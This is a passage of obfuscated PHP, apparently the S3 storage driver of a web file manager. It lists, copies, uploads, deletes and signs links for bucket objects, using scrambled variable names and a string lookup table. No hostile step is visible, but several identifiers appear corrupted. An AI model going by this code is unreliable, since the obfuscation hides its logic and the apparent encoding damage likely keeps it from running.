(IO::fileNameExist($™™õÔäî, $«²Î´‚‰)) { return $¾õ¶İÀÏ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $²õ†Àú¬ = DATA_THUMB . $«²Î´‚‰; del_file($²õ†Àú¬); $ÜıõÛƒ = TEMP_FILES . $«²Î´‚‰; if (!@file_exists($ÜıõÛƒ)) { $ÜıõÛƒ = $this->download($ÆîÌãó€, $ÜıõÛƒ); } if (!@file_exists($ÜıõÛƒ)) { return $¾õ¶İÀÏ[204]; } ImageThumb::createThumb($ÜıõÛƒ, $²õ†Àú¬, $‘¥¨‹¿, $‘¥¨‹¿ * 10); if (@file_exists($²õ†Àú¬)) { Cache::remove($«²Î´‚‰); return IO::move($²õ†Àú¬, $™™õÔäî); } Cache::set($«²Î´‚‰, $¾õ¶İÀÏ[196], 600); del_file($²õ†Àú¬); return $¾õ¶İÀÏ[205] . $ÜıõÛƒ . $¾õ¶İÀÏ[83]; } public function fileOutImageServer($Ğ’ò÷ÌÒ, $İ³¢Ì®Ó = 250) { $this->fileOutImage($Ğ’ò÷ÌÒ, $İ³¢Ì®Ó); } public function fileNameAuto($ŒŒ‘à÷¨, $üÀ°°…, $ªíëåä‰ = REPEAT_RENAME, $²»£µù¯ = false) { $Óó¥Ù‡“ =& $_SERVER[•€áå–Õ]; $½Ä¹šİ– = $ŒŒ‘à÷¨ === $Óó¥Ù‡“[22] ? $üÀ°°… : rtrim($ŒŒ‘à÷¨, $Óó¥Ù‡“[18]) . $Óó¥Ù‡“[18] . $üÀ°°…; if ($ªíëåä‰ == REPEAT_REPLACE || !$this->exist($½Ä¹šİ–) || $²»£µù¯ && $ªíëåä‰ != REPEAT_RENAME_FOLDER) { return $üÀ°°…; } if ($ªíëåä‰ == REPEAT_SKIP) { return !1; } $¡ô··Ö´ = $Óó¥Ù‡“[20] . get_path_ext($üÀ°°…); $¡ô··Ö´ = $¡ô··Ö´ == $Óó¥Ù‡“[20] || $²»£µù¯ ? $Óó¥Ù‡“[22] : $¡ô··Ö´; $ëó“è‚Ò = 1; $šû™ = substr($üÀ°°…, 0, strlen($üÀ°°…) - strlen($¡ô··Ö´)); $Ü¾ü€à† = $šû™ . "\50{$ëó“è‚Ò}\51{$¡ô··Ö´}"; while ($this->exist(rtrim($ŒŒ‘à÷¨, $Óó¥Ù‡“[18]) . $Óó¥Ù‡“[18] . $Ü¾ü€à†)) { $Ü¾ü€à† = $šû™ . "\x28{$ëó“è‚Ò}\x29{$¡ô··Ö´}"; $ëó“è‚Ò++; } return $Ü¾ü€à†; } private function fileNameAutoList($®ˆ·¨Ùí, $Í¥â ı±, $ÑĞâé£Ò = false) { $½áÎ»½ó =& $_SERVER[•€áå–Õ]; $ø‚õ¸´ = $this->listPath($®ˆ·¨Ùí, !0); $ø‚õ¸´ = array_merge($ø‚õ¸´[$½áÎ»½ó[94]], $ø‚õ¸´[$½áÎ»½ó[95]]); $òÕ³úü = array_to_keyvalue($ø‚õ¸´, $½áÎ»½ó[22], $½áÎ»½ó[42]); $”Àİô¡ = $½áÎ»½ó[20] . get_path_ext($Í¥â ı±); $”Àİô¡ = $”Àİô¡ == $½áÎ»½ó[20] || $ÑĞâé£Ò ? $½áÎ»½ó[22] : $”Àİô¡; $Üı–Ù = substr($Í¥â ı±, 0, strlen($Í¥â ı±) - strlen($”Àİô¡)); $à¶éÎŠ£ = $Üı–Ù . "\x28\60\51{$”Àİô¡}"; for ($ÉöÑ¿±ç = 1; $ÉöÑ¿±ç <= count($òÕ³úü) + 1; $ÉöÑ¿±ç++) { $à¶éÎŠ£ = $Üı–Ù . "\50{$ÉöÑ¿±ç}\x29{$”Àİô¡}"; if (!in_array_not_case($à¶éÎŠ£, $òÕ³úü)) { return $à¶éÎŠ£; } } return $à¶éÎŠ£; } public function listAllFiles($”¡‚Áñ, $‚Õ) { $ü”£‘ŞÔ =& $_SERVER[•€áå–Õ]; if (empty($‚Õ)) { return array(); } $šı¯­ = array_keys($‚Õ); $‡Û‡ôö = array(); $”¡‚Áñ = trim($”¡‚Áñ, $ü”£‘ŞÔ[18]); foreach ($‚Õ as $û‚îØÀÉ => $ºûÇË ±) { $–¢ë…× = ltrim(substr(trim($û‚îØÀÉ, $ü”£‘ŞÔ[18]), strlen($”¡‚Áñ)), $ü”£‘ŞÔ[18]); if (substr($û‚îØÀÉ, -1) == $ü”£‘ŞÔ[18]) { $–¢ë…× = rtrim($–¢ë…×, $ü”£‘ŞÔ[18]) . $ü”£‘ŞÔ[18]; } $‡Û‡ôö = array_merge($‡Û‡ôö, $this->slicePath($–¢ë…×)); } $¬Õ©é—¾ = array(); foreach (array_unique($‡Û‡ôö) as $Ó®ÚÛÚë) { $üÆ™ìŒ§ = array($ü”£‘ŞÔ[96] => $this->getPathOuter($ü”£‘ŞÔ[18] . $”¡‚Áñ . $ü”£‘ŞÔ[18] . $Ó®ÚÛÚë), $ü”£‘ŞÔ[87] => 1, $ü”£‘ŞÔ[88] => 0); if (substr($Ó®ÚÛÚë, -1) != $ü”£‘ŞÔ[18]) { $üÆ™ìŒ§[$ü”£‘ŞÔ[87]] = 0; $ÀäçÊƒÂ = $this->getPath($”¡‚Áñ . $ü”£‘ŞÔ[18] . $Ó®ÚÛÚë); if (isset($‚Õ[$ÀäçÊƒÂ])) { $°íéÃáë = $‚Õ[$ÀäçÊƒÂ]; if (isset($°íéÃáë[$ü”£‘ŞÔ[88]])) { $üÆ™ìŒ§[$ü”£‘ŞÔ[88]] = intval($°íéÃáë[$ü”£‘ŞÔ[88]]); } if (isset($°íéÃáë[$ü”£‘ŞÔ[206]])) { $üÆ™ìŒ§[$ü”£‘ŞÔ[97]] = intval($°íéÃáë[$ü”£‘ŞÔ[206]]); } } } $¬Õ©é—¾[] = $üÆ™ìŒ§; } return $¬Õ©é—¾; } public function slicePath($©±¥‹¯ˆ) { $§ıƒàøö =& $_SERVER[•€áå–Õ]; $µƒ®¾µ = explode($§ıƒàøö[18], trim($©±¥‹¯ˆ, $§ıƒàøö[18])); $¯ßŠòÆğ = 0; do { ++$¯ßŠòÆğ; $‚ÉÄâ‚á[] = implode($§ıƒàøö[18], array_slice($µƒ®¾µ, 0, $¯ßŠòÆğ)) . $§ıƒàøö[18]; } while ($¯ßŠòÆğ < count($µƒ®¾µ)); $‚ÉÄâ‚á[count($µƒ®¾µ) - 1] = $©±¥‹¯ˆ; return $‚ÉÄâ‚á; } public function getHost() { $¼‹”Ã±¸ =& $_SERVER[•€áå–Õ]; $‰´µ¦½ã = parse_url(trim($this->domain, $¼‹”Ã±¸[18])); $ÂŸ–à‰– = isset($‰´µ¦½ã[$¼‹”Ã±¸[207]]) ? $‰´µ¦½ã[$¼‹”Ã±¸[207]] : http_type(); $ÜâÆâãÏ = isset($‰´µ¦½ã[$¼‹”Ã±¸[208]]) ? $‰´µ¦½ã[$¼‹”Ã±¸[208]] : $‰´µ¦½ã[$¼‹”Ã±¸[96]]; if (isset($‰´µ¦½ã[$¼‹”Ã±¸[209]])) { $ÜâÆâãÏ .= $¼‹”Ã±¸[4] . $‰´µ¦½ã[$¼‹”Ã±¸[209]]; } return $ÂŸ–à‰– . $¼‹”Ã±¸[210] . $ÜâÆâãÏ; } public function pathEncode($ÖÄ‘©) { $õı‹Ó‰˜ =& $_SERVER[•€áå–Õ]; return str_replace($õı‹Ó‰˜[211], $õı‹Ó‰˜[18], rawurlencode($ÖÄ‘©)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($³òÀäˆÂ) { set_timeout(); require_once SDK_DIR . $_SERVER[•€áå–Õ][212]; parent::__construct(); $this->_init($³òÀäˆÂ); } public function _init($«¯¿ëêÓ) { $this->config = $«¯¿ëêÓ; foreach ($«¯¿ëêÓ as $™êı…´¦ => $ÚÏ¨›¶ê) { if (isset($this->{$™êı…´¦})) { $this->{$™êı…´¦} = $ÚÏ¨›¶ê; } } $this->endpoint = $«¯¿ëêÓ[$_SERVER[•€áå–Õ][213]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($ÔÛô“Ûë = "\x76\x34") { $this->signVer = $ÔÛô“Ûë; $this->client->setSignatureVersion($ÔÛô“Ûë); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ç†óÏ¤¥ =& $_SERVER[•€áå–Õ]; $ÕÒÁ¹ªÅ = $this->getBucketCors(); if (!$ÕÒÁ¹ªÅ || !is_array($ÕÒÁ¹ªÅ)) { return !1; } if ($ÕÒÁ¹ªÅ[$ç†óÏ¤¥[214]] != $ç†óÏ¤¥[215] || $ÕÒÁ¹ªÅ[$ç†óÏ¤¥[216]] != $ç†óÏ¤¥[215]) { return !1; } $¿¾üéÌ¯ = array_map($ç†óÏ¤¥[217], $ÕÒÁ¹ªÅ[$ç†óÏ¤¥[218]]); if (!is_array($¿¾üéÌ¯)) { $¿¾üéÌ¯ = array(); } $ŠÕ†ğùâ = array($ç†óÏ¤¥[219], $ç†óÏ¤¥[220], $ç†óÏ¤¥[221], $ç†óÏ¤¥[222], $ç†óÏ¤¥[223]); $—ş½°¼İ = array_diff($ŠÕ†ğùâ, $¿¾üéÌ¯); return empty($—ş½°¼İ); } public function mkfile($ß˜àıÚƒ, $±†ˆ—ÖÙ = '', $ŞêÛ„ ™ = REPEAT_RENAME) { $µ¶”£ = $this->setContent($ß˜àıÚƒ, $±†ˆ—ÖÙ); if ($µ¶”£ !== !1) { return $this->getPathOuter($ß˜àıÚƒ); } return !1; } public function mkdir($ÕØé£à, $õ’Û¿— = REPEAT_SKIP) { $÷¤Â®Ã =& $_SERVER[•€áå–Õ]; if (empty($ÕØé£à) && $ÕØé£à !== $÷¤Â®Ã[224]) { return !1; } if ($õ’Û¿— && $this->_isFolder($ÕØé£à)) { return $this->getPathOuter($ÕØé£à); } $‘İè«Èú = $this->setContent($ÕØé£à, $÷¤Â®Ã[22], !0); if ($‘İè«Èú !== !1) { return $this->getPathOuter($ÕØé£à); } return !1; } public function copyFile($¼Ôñ¯´, $ñºÆ†«Å, $İæ—Õß² = array()) { $Öˆª°¨Ò =& $_SERVER[•€áå–Õ]; $îı‘ıÄà = $this->objectMeta($¼Ôñ¯´); if (!$îı‘ıÄà) { return !1; } if ($îı‘ıÄà[$Öˆª°¨Ò[88]] <= 1024 * 1024 * 200) { $ºØ¨ÉĞÅ = $this->client->copyObject($this->bucket, $¼Ôñ¯´, $this->bucket, $ñºÆ†«Å, $Öˆª°¨Ò[225], $İæ—Õß²); } else { $ºØ¨ÉĞÅ = $this->client->multiCopyObject($this->bucket, $¼Ôñ¯´, $this->bucket, $ñºÆ†«Å, $İæ—Õß²); } $ºØ¨ÉĞÅ = $ºØ¨ÉĞÅ ? $this->getPathOuter($ñºÆ†«Å) : !1; return $ºØ¨ÉĞÅ; } public function moveFile($€Ş¡¸»Ğ, $¡¶ù¨ÔÍ) { if ($this->copyFile($€Ş¡¸»Ğ, $¡¶ù¨ÔÍ)) { $this->delFile($€Ş¡¸»Ğ); return $this->getPathOuter($¡¶ù¨ÔÍ); } return !1; } public function delFile($Ä÷·¡¤) { return $this->client->deleteObject($this->bucket, $Ä÷·¡¤); } public function delFolder($Ä¤•–î¾) { $õâıçÙ =& $_SERVER[•€áå–Õ]; if (!$this->exist($Ä¤•–î¾)) { return !0; } $this->listItemCache = !1; $¡ƒåø«± = $this->fileList($Ä¤•–î¾); $this->listItemCache = !0; $¬”êúƒ¬ = trim($Ä¤•–î¾, $õâıçÙ[18]) . $õâıçÙ[18]; if (!empty($Ä¤•–î¾) && $Ä¤•–î¾ !== $õâıçÙ[224] && !in_array($¬”êúƒ¬, $¡ƒåø«±[$õâıçÙ[94]])) { $¡ƒåø«±[$õâıçÙ[94]][] = $¬”êúƒ¬; } $µÙíÔ = $this->delByBatch($¡ƒåø«±[$õâıçÙ[95]]); if (!$µÙíÔ) { return !1; } $µÙíÔ = $this->delByBatch($¡ƒåø«±[$õâıçÙ[94]]); if (!$µÙíÔ) { return !1; } return $this->delFile($¬”êúƒ¬); } private function delByBatch($ˆ…œ§è®) { foreach (array_chunk($ˆ…œ§è®, 1000) as $Ø–ñÆÛ²) { $Î¹Ÿ¶Õë = $this->client->deleteObjects($this->bucket, $Ø–ñÆÛ²); if (!$Î¹Ÿ¶Õë) { return !1; } } return !0; } public function rename($ı°ã¦±í, $¢ı„½¹ç) { return $this->renameObject($ı°ã¦±í, $¢ı„½¹ç); } public function listPath($©“¯õú², $ˆğ™”˜ = false) { $ëó©ı¤ =& $_SERVER[•€áå–Õ]; $­áÄé·‚ = $this->fileList($©“¯õú², $ëó©ı¤[18], !0); foreach ($­áÄé·‚[$ëó©ı¤[94]] as $ôÍØªë => $¢šÑœÛñ) { $­áÄé·‚[$ëó©ı¤[94]][$ôÍØªë] = $this->folderInfo($¢šÑœÛñ, $ˆğ™”˜, $¢šÑœÛñ); } foreach ($­áÄé·‚[$ëó©ı¤[95]] as $ôÍØªë => $¢šÑœÛñ) { $­áÄé·‚[$ëó©ı¤[95]][$ôÍØªë] = $this->fileInfo($¢šÑœÛñ[$ëó©ı¤[42]], $ˆğ™”˜, $¢šÑœÛñ); } return $­áÄé·‚; } protected function infoChildren($÷ÀËæÈ¤, &$øàÅ‘·ë) { $æì†–Îƒ =& $_SERVER[•€áå–Õ]; $€ßÖõë¸ = $this->fileList($÷ÀËæÈ¤, $æì†–Îƒ[22], !0); $øàÅ‘·ë[$æì†–Îƒ[90]] += count($€ßÖõë¸[$æì†–Îƒ[94]]); $øàÅ‘·ë[$æì†–Îƒ[89]] += count($€ßÖõë¸[$æì†–Îƒ[95]]); foreach ($€ßÖõë¸[$æì†–Îƒ[95]] as $ÖªŞÁ¨…) { if (!$ÖªŞÁ¨… || !$ÖªŞÁ¨…[$æì†–Îƒ[88]]) { continue; } $øàÅ‘·ë[$æì†–Îƒ[88]] += $ÖªŞÁ¨…[$æì†–Îƒ[88]]; } } private function fileInfo($¤íòÁïŒ, $Æ¾Çç°ú = false, $†¢–÷€Ş = array()) { $Ì¼úç«ğ =& $_SERVER[•€áå–Õ]; $•“ûŒä÷ = array($Ì¼úç«ğ[42] => $this->pathThis($¤íòÁïŒ), $Ì¼úç«ğ[96] => $this->getPathOuter($¤íòÁïŒ), $Ì¼úç«ğ[43] => $Ì¼úç«ğ[226], $Ì¼úç«ğ[187] => $this->ext($¤íòÁïŒ), $Ì¼úç«ğ[88] => isset($†¢–÷€Ş[$Ì¼úç«ğ[88]]) ? $†¢–÷€Ş[$Ì¼úç«ğ[88]] : 0); if ($Æ¾Çç°ú) { return $•“ûŒä÷; } $•“ûŒä÷[$Ì¼úç«ğ[227]] = $•“ûŒä÷[$Ì¼úç«ğ[97]] = 0; $•“ûŒä÷[$Ì¼úç«ğ[228]] = $•“ûŒä÷[$Ì¼úç«ğ[229]] = !0; if (empty($†¢–÷€Ş)) { $†¢–÷€Ş = $this->objectMeta($¤íòÁïŒ); if (!$†¢–÷€Ş) { return $•“ûŒä÷; } } if (isset($†¢–÷€Ş[$Ì¼úç«ğ[230]]) && $†¢–÷€Ş[$Ì¼úç«ğ[230]]) { $•“ûŒä÷[$Ì¼úç«ğ[231]] = $†¢–÷€Ş[$Ì¼úç«ğ[230]]; } if (isset($†¢–÷€Ş[$Ì¼úç«ğ[206]])) { $•“ûŒä÷[$Ì¼úç«ğ[97]] = $†¢–÷€Ş[$Ì¼úç«ğ[206]]; } if (isset($†¢–÷€Ş[$Ì¼úç«ğ[88]])) { $•“ûŒä÷[$Ì¼úç«ğ[88]] = $†¢–÷€Ş[$Ì¼úç«ğ[88]]; } return $•“ûŒä÷; } private function folderInfo($Æú„Ç€ô, $ñªêé‘© = false, $Ìš×®£ = array()) { $ğš¯ä™ò =& $_SERVER[•€áå–Õ]; $ıÀ¸åöÜ = array($ğš¯ä™ò[42] => $this->pathThis($Æú„Ç€ô), $ğš¯ä™ò[96] => $this->getPathOuter($ğš¯ä™ò[18] . $Æú„Ç€ô), $ğš¯ä™ò[43] => $ğš¯ä™ò[87]); if ($ñªêé‘©) { return $ıÀ¸åöÜ; } $ıÀ¸åöÜ[$ğš¯ä™ò[227]] = $ıÀ¸åöÜ[$ğš¯ä™ò[97]] = 0; $ıÀ¸åöÜ[$ğš¯ä™ò[228]] = $ıÀ¸åöÜ[$ğš¯ä™ò[229]] = !0; if ($Æú„Ç€ô == $ğš¯ä™ò[22]) { return $ıÀ¸åöÜ; } if (empty($Ìš×®£)) { $Ìš×®£ = $this->objectMeta(trim($Æú„Ç€ô, $ğš¯ä™ò[18]) . $ğš¯ä™ò[18]); } if (isset($Ìš×®£[$ğš¯ä™ò[206]])) { $ıÀ¸åöÜ[$ğš¯ä™ò[227]] = $Ìš×®£[$ğš¯ä™ò[206]]; } return $ıÀ¸åöÜ; } private function fileList($ï£œ­‚Ô, $Â¦¶ = '', $•˜»—‰Æ = 0) { $õŒµï¤¶ =& $_SERVER[•€áå–Õ]; $˜ —“º = rtrim($ï£œ­‚Ô, $õŒµï¤¶[18]) . $õŒµï¤¶[18]; $ıËŠæ = $this->listObjs($˜ —“º, null, null, $Â¦¶); if (!$ıËŠæ) { return array($õŒµï¤¶[94] => array(), $õŒµï¤¶[95] => array()); } $Å“˜‡Á‚ = $ïÆµ£šœ = array(); foreach ($ıËŠæ[$õŒµï¤¶[232]] as $œï¯ˆ·í) { $¯§è¶› = $œï¯ˆ·í[$õŒµï¤¶[42]]; if ($¯§è¶› == $˜ —“º) { continue; } $®¢ıóÜé = isset($œï¯ˆ·í[$õŒµï¤¶[88]]) ? $œï¯ˆ·í[$õŒµï¤¶[88]] : 0; $ÂÊ¾ÍÍ… = $®¢ıóÜé == 0 && substr($¯§è¶›, strlen($¯§è¶›) - 1, 1) == $õŒµï¤¶[18] ? !0 : !1; $this->cacheMethodInfoSet($¯§è¶›, $ÂÊ¾ÍÍ…, $œï¯ˆ·í); if ($ÂÊ¾ÍÍ…) { $Å“˜‡Á‚[] = $¯§è¶›; continue; } $ïÆµ£šœ[] = $•˜»—‰Æ ? $œï¯ˆ·í : $¯§è¶›; } foreach ($ıËŠæ[$õŒµï¤¶[233]] as $œï¯ˆ·í) { $Å“˜‡Á‚[] = $œï¯ˆ·í[$õŒµï¤¶[42]]; $this->cacheMethodInfoSet($œï¯ˆ·í[$õŒµï¤¶[42]], !0); } $this->cacheMethodInfoSet($ï£œ­‚Ô, !0); return array($õŒµï¤¶[94] => $Å“˜‡Á‚, $õŒµï¤¶[95] => $ïÆµ£šœ); } private function listObjs($öªÇŸ²³, $¹¼ó‹½ = null, $‡´è¿î– = null, $â‚œÔæ‚ = null) { $ø¬ëªæ =& $_SERVER[•€áå–Õ]; $öªÇŸ²³ = trim($öªÇŸ²³, $ø¬ëªæ[18]); $Ûá¥“² = empty($öªÇŸ²³) && $öªÇŸ²³ !== $ø¬ëªæ[224] ? $ø¬ëªæ[22] : $öªÇŸ²³ . $ø¬ëªæ[18]; return $this->client->getBucket($this->bucket, $Ûá¥“², $¹¼ó‹½, $‡´è¿î–, $â‚œÔæ‚, !0); } public function has($ò§²øò³, $Ö¶­Åë = false, $ïÖàÌäğ = true) { $¶÷¹³İˆ =& $_SERVER[•€áå–Õ]; $ò§²øò³ = trim($ò§²øò³, $¶÷¹³İˆ[18]); $µÄùêë = empty($ò§²øò³) && $ò§²øò³ !== $¶÷¹³İˆ[224] ? $¶÷¹³İˆ[22] : $ò§²øò³ . $¶÷¹³İˆ[18]; $Úºëº = null; $´–íá© = 500; $Ë´Ş² = $¶÷¹³İˆ[18]; $¶Œ²¤ñØ = $¼ƒ„¢É¬ = array(); while (!0) { $œ§ºå¢í = $this->listObjs($ò§²øò³, $Úºëº, $´–íá©, $Ë´Ş²); if (!$œ§ºå¢í) { break; } $Úºëº = $œ§ºå¢í[$¶÷¹³İˆ[234]]; $«¤ûÙùû = $œ§ºå¢í[$¶÷¹³İˆ[232]]; $ƒµËÕû® = $œ§ºå¢í[$¶÷¹³İˆ[233]]; if (empty($«¤ûÙùû) && empty($ƒµËÕû®)) { break; } if (count($«¤ûÙùû) == 1 && $«¤ûÙùû[0][$¶÷¹³İˆ[42]] == $µÄùêë) { break; } if ($Ö¶­Åë) { if (count($«¤ûÙùû)) { $«¤ûÙùû = array_column($«¤ûÙùû, $¶÷¹³İˆ[42]); $¶Œ²¤ñØ = array_merge($¶Œ²¤ñØ, $«¤ûÙùû); } if (count($ƒµËÕû®)) { $ƒµËÕû® = array_column($ƒµËÕû®, $¶÷¹³İˆ[42]); $¼ƒ„¢É¬ = array_merge($¼ƒ„¢É¬, $ƒµËÕû®); } if ($Úºëº === null) { break; } continue; } if ($ïÖàÌäğ) { if (!empty($«¤ûÙùû)) { if (count($«¤ûÙùû) > 1 || isset($«¤ûÙùû[0][$¶÷¹³İˆ[42]]) && $«¤ûÙùû[0][$¶÷¹³İˆ[42]] != $µÄùêë) { return !0; } } } else { if (!empty($ƒµËÕû®)) { return !0; } } if ($Úºëº === null) { break; } } if ($Ö¶­Åë) { $¶Œ²¤ñØ = array_diff($¶Œ²¤ñØ, array($µÄùêë)); $¶Œ²¤ñØ = count(array_unique($¶Œ²¤ñØ)); $¼ƒ„¢É¬ = count(array_unique($¼ƒ„¢É¬)); return array($¶÷¹³İˆ[235] => $¶Œ²¤ñØ, $¶÷¹³İˆ[236] => $¼ƒ„¢É¬); } return !1; } public function listAll($¶°‚¸²Ã) { $’º´¯Ìû =& $_SERVER[•€áå–Õ]; $£ÓÏŞÎå = $this->fileList($¶°‚¸²Ã, $’º´¯Ìû[22], !0); $ÜÔÖ€œú = array_to_keyvalue($£ÓÏŞÎå[$’º´¯Ìû[95]], $’º´¯Ìû[42]); foreach ($£ÓÏŞÎå[$’º´¯Ìû[94]] as $Ãç©Ú) { if (is_string($Ãç©Ú)) { $ÜÔÖ€œú[$Ãç©Ú] = array($’º´¯Ìû[88] => 0); } } return $this->listAllFiles($¶°‚¸²Ã, $ÜÔÖ€œú); } public function canRead($âÁ«ã¼ß) { $“ÛŸ„›æ =& $_SERVER[•€áå–Õ]; $¥”Óö€ = $this->client->getAccessControlPolicy($this->bucket, $âÁ«ã¼ß); if (!$¥”Óö€) { return !1; } return in_array($¥”Óö€, array($“ÛŸ„›æ[237], $“ÛŸ„›æ[238], $“ÛŸ„›æ[239])) ? !0 : !1; } public function canWrite($‡½åè¼) { $ËÔŠÖ…Û =& $_SERVER[•€áå–Õ]; $øè›³Ş­ = $this->client->getAccessControlPolicy($this->bucket, $‡½åè¼); if (!$øè›³Ş­) { return !1; } return in_array($øè›³Ş­, array($ËÔŠÖ…Û[237], $ËÔŠÖ…Û[238])) ? !0 : !1; } public function getContent($ÊÌÏÖñ¦) { return $this->client->getObject($this->bucket, $ÊÌÏÖñ¦); } public function setContent($çÔ°Œä, $ÍÆÙÀ÷« = '', $†êğŠÚ– = false) { $š¡í¿Ï =& $_SERVER[•€áå–Õ]; $çÔ°Œä = $†êğŠÚ– ? trim($çÔ°Œä, $š¡í¿Ï[18]) . $š¡í¿Ï[18] : $çÔ°Œä; $°ãÃº¶Ğ = get_file_mime(get_path_ext($çÔ°Œä)); $Š˜ÙƒÕâ = $this->client->putObject($ÍÆÙÀ÷«, $this->bucket, $çÔ°Œä, $š¡í¿Ï[225], array(), $°ãÃº¶Ğ); if (!$Š˜ÙƒÕâ) { return !1; } if ($†êğŠÚ–) { return !0; } $this->cacheMethod(null, null); $Š˜ÙƒÕâ = $this->copyFile($çÔ°Œä, $çÔ°Œä, array($š¡í¿Ï[240] => $Š˜ÙƒÕâ[$š¡í¿Ï[230]])); return $Š˜ÙƒÕâ ? !0 : !1; } public function fileSubstr($ïÔ¤®ˆè, $Ö ¦´šƒ, $¨ÍğÈÃç) { $¾¯Ûøüª = $Ö ¦´šƒ + $¨ÍğÈÃç - 1; return $this->client->getObject($this->bucket, $ïÔ¤®ˆè, array($_SERVER[•€áå–Õ][241] => "\x62\x79\x74\145\163\75{$Ö ¦´šƒ}\x2d{$¾¯Ûøüª}")); } public function upload($Á×ÔÈÄ‘, $ïÔÅ½°š, $ß©÷¸… = false, $Ö†áïóÔ = REPEAT_REPLACE) { $ş±Ğ€Û =& $_SERVER[•€áå–Õ]; $èüœ­÷² = array($ş±Ğ€Û[240] => @md5_file($ïÔÅ½°š)); $ÕòåŞ€Â = array($ş±Ğ€Û[242] => get_file_mime(get_path_ext($Á×ÔÈÄ‘))); if (IO::size($ïÔÅ½°š) <= 1024 * 1024 * 200) { $‘œìéë– = $this->client->putObjectFile($ïÔÅ½°š, $this->bucket, $Á×ÔÈÄ‘, $ş±Ğ€Û[225], $èüœ­÷², $ÕòåŞ€Â); return !empty($‘œìéë–) ? $this->getPathOuter($Á×ÔÈÄ‘) : !1; } $Øñ¹¬‹Ù = $this->client->multiUploadObject($ïÔÅ½°š, $this->bucket, trim($Á×ÔÈÄ‘, $ş±Ğ€Û[18]), $èüœ­÷², $ÕòåŞ€Â); return $Øñ¹¬‹Ù ? $this->getPathOuter($Á×ÔÈÄ‘) : !1; } public function download($³®»æœâ, $ñÏ¢¦Ù–) { if (!@is_dir($this->pathFather($ñÏ¢¦Ù–)) && !IO::mkdir($this->pathFather($ñÏ¢¦Ù–))) { return !1; } $ïËö¹ö¿ = $this->client->getObject($this->bucket, $³®»æœâ, array(), $ñÏ¢¦Ù–); return $ïËö¹ö¿ !== !1 ? $ñÏ¢¦Ù– : !1; } public function link($¨ßÌğÛŠ, $Ôªèíû = array()) { $“ï¬‘Ìì =& $_SERVER[•€áå–Õ]; if ($this->signVer == $“ï¬‘Ìì[243]) { return $this->client->getAuthenticatedURL($this->bucket, $¨ßÌğÛŠ, 3600 * 12, $Ôªèíû); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($¨ßÌğÛŠ, $“ï¬‘Ìì[18]), 3600 * 12, $this->region, array(), !0, $Ôªèíû); } public function fileOut($éåÛÌú÷, $¤ø–øè· = false, $¨¾ƒ’»¾ = false, $ßÙØ˜¦á = '') { $¡»ûÂºå =& $_SERVER[•€áå–Õ]; if ($this->isFileOutServer()) { return $this->fileOutServer($éåÛÌú÷, $¤ø–øè·, $¨¾ƒ’»¾, $ßÙØ˜¦á); } if (!$¨¾ƒ’»¾) { $¨¾ƒ’»¾ = $this->pathThis($éåÛÌú÷); } $„â¡Ïú¯ = get_file_mime(get_path_ext($¨¾ƒ’»¾)); if ($„â¡Ïú¯ == $¡»ûÂºå[244]) { return parent::fileOut($éåÛÌú÷, $¤ø–øè·, $¨¾ƒ’»¾, $ßÙØ˜¦á); } $Ë‘¥¾›â = array($¡»ûÂºå[245] => $„â¡Ïú¯); if ($¤ø–øè·) { $Ë‘¥¾›â[$¡»ûÂºå[246]] = $¡»ûÂºå[247] . rawurlencode($¨¾ƒ’»¾); } else { } $îñ†ıö¦ = $this->link($éåÛÌú÷, $Ë‘¥¾›â); $this->fileOutLink($îñ†ıö¦); } public function fileOutServer($ÖÑşº¶, $¿Í¬ÁáÔ = false, $—õ¥Õ² = false, $ŒãÆùáÂ = '') { parent::fileOut($ÖÑşº¶, $¿Í¬ÁáÔ, $—õ¥Õ², $ŒãÆùáÂ); } public function fileOutImageServer($®­‡Í©¬, $‘î‘ï²à = 250) { parent::fileOutImage($®­‡Í©¬, $‘î‘ï²à); } public function hashMd5($¶æäÔ¼±, $ó¨™§ÂÍ = '') { $ĞÇ€ áÎ =& $_SERVER[•€áå–Õ]; $¦ø»ˆã = $this->objectMeta($¶æäÔ¼±); if (!$¦ø»ˆã) { return !1; } $ó¨™§ÂÍ = $ó¨™§ÂÍ ? $ó¨™§ÂÍ : _get($¦ø»ˆã, $ĞÇ€ áÎ[248]); $ó¨™§ÂÍ = $ó¨™§ÂÍ ? $ó¨™§ÂÍ : _get($¦ø»ˆã, $ĞÇ€ áÎ[230], $ĞÇ€ áÎ[22]); return $ó¨™§ÂÍ; } public function uploadFormData($š¹Ä¯´ï, $§€ÌÜƒ = 3600) { $Ñí™Í°ª =& $_SERVER[•€áå–Õ]; $«Ïø¥Êî = $this->pathFather($š¹Ä¯´ï); $Œûíµà = $this->client->getHttpUploadPostParams($this->bucket, $«Ïø¥Êî, $Ñí™Í°ª[225], $§€ÌÜƒ); return array_merge((array) $Œûíµà, array($Ñí™Í°ª[208] => $this->getHost())); } public function multiUploadFormData($×Æãáè, $ı·¨ì¿® = 3600) { $¦ú©×šñ =& $_SERVER[•€áå–Õ]; $º“¸‰® = gmdate($¦ú©×šñ[249]); $½À”¹»Ò = array(); $Ú¢†«Ÿ = $this->client->getUploadId($this->bucket, $×Æãáè, $½À”¹»Ò); if (!$Ú¢†«Ÿ) { return !1; } return array($¦ú©×šñ[250] => $Ú¢†«Ÿ, $¦ú©×šñ[208] => $this->getHost() . $¦ú©×šñ[18] . $this->pathEncode($×Æãáè), $¦ú©×šñ[251] => $º“¸‰®, $¦ú©×šñ[106] => $×Æãáè); } public function multiUploadAuthData($×ßª£ÇŠ, $ıŸ‹É†ö = array()) { $é­š³õ =& $_SERVER[•€áå–Õ]; $†·ŠÅ¾ = isset($ıŸ‹É†ö[$é­š³õ[251]]) ? $ıŸ‹É†ö[$é­š³õ[251]] : gmdate($é­š³õ[249]); $ü±§‰“ = isset($ıŸ‹É†ö[$é­š³õ[187]]) 